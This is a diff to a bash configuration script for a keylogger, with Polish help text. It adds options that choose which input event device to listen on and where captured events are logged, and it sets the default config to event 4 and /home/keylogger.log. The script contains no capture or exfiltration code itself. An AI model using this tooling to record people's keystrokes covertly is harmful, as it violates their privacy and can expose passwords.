@@ -11,17 +11,25 @@ fi
 if test $# -lt 2
 then
 	echo 'Usage : keylogger_conf --auto {true|false}'
+	echo '   or : keylogger_conf --event _liczba_'
+	echo '	 or : keylogger_conf --log sciezka_do_pliku'
 	echo '   or : keylogger_conf --add word1 word2 ...'
 	echo '   or : keylogger_conf --rem word1 word2 ...'
 	echo ''
 	echo 'Powyzsze opcje mozna laczyc, np. keylogger_conf --auto true --add word1 --rem word2'
+	echo '\t --auto \t: czy program ma startować automatycznie'
+	echo '\t --event \t: numer zdarzenia które ma być nasłuchiwane'
+	echo '\t\t  program nie bedzie dzialal poprawnie jest to zdarzenie nie bedzie zwiazane z klawiatura'
+	echo '\t --log \t: konfiguracja sciezki do pliku w ktorym maja byc zapisywane zdarzenia'
+	echo '\t --add \t: dodanie slow do listy wykrywania'
+	echo '\t --rem \t: usuniecie slow z listy wykrywania'
 	exit
 fi
 
 if !([ -f $FILEPATH ])
 then
 	echo "Brak pliku konfiguracyjnego, zostanie on utworzony."
-	echo "auto=true\n------klucze------" > $FILEPATH
+	echo "auto=true\n4\n/home/keylogger.log\n------klucze------" > $FILEPATH
 	echo "Plik utworzony"
 fi
 
@@ -46,6 +54,18 @@ do
 				exit
 			fi		
 		;;
+		"--event")
+			if [[ $1 =~ ^[0-9]+$ ]]
+			then
+				sed -i '2c\'$1 $FILEPATH
+			else
+				echo "Niepoprawny argument dla --event! == $1"
+				exit
+			fi
+		;; 
+		"--log")
+			sed -i '3c\'$1 $FILEPATH		
+		;;	
 		"--add")
 			if !(grep -Fxq $1 $FILEPATH)
 			then
